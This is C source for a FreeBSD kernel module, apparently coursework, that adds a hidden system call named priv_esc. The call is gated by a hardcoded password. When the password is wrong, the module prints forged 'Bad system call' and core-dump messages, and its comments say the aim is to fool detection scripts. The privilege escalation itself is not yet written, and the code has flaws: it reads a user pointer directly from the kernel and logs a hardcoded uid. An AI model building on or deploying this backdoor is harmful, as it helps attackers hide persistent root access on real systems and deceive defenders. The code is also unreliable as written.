#include <sys/param.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/sysproto.h>
#include <sys/errno.h>
#include <sys/proc.h>

#define PRIV_ESC_PASSWD "6447_priv_esc_passwd"

/* The system call's arguments. */
struct sc_args {
	char *passwd;
};

/* The system call function. */
static int
priv_esc(struct thread *td, void *syscall_args) {
    struct sc_args * args = (struct sc_args *) syscall_args;

    if (strcmp(args->passwd, PRIV_ESC_PASSWD) != 0) {

        uprintf("[*] module: incorrect password provided\n");

        // will write to controlling tty
        // TODO need to print this to the correct stream
        uprintf("Bad system call (core dumped)\n");

        // printf will write to dmesg
        // took me (jshi) so long to figure out that struct thread is defined in /sys/sys/proc.h
        // struct thread and struct proc are defined in proc.h
        // TODO figure out uid from struct thread/struct proc/somewhere else
        // TODO dump core OR write a random core file to pwd (proc_name.core) to fool detection scripts.
        printf("pid %d (%s), uid %d: exited on signal 12 (core dumped)\n",
                td->td_proc->p_pid, td->td_proc->p_comm, 0);

        return ENOSYS;
    }

    uprintf("[*] module: correct password provided\n");
	return 0;
}

/* The sysent for the new system call. */
static struct sysent priv_esc_sysent = {
	1,              /* number of arguments */
	priv_esc        /* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int
load(struct module *module, int cmd, void *arg) {
    return 0;
}

SYSCALL_MODULE(priv_esc, &offset, &priv_esc_sysent, load, NULL);
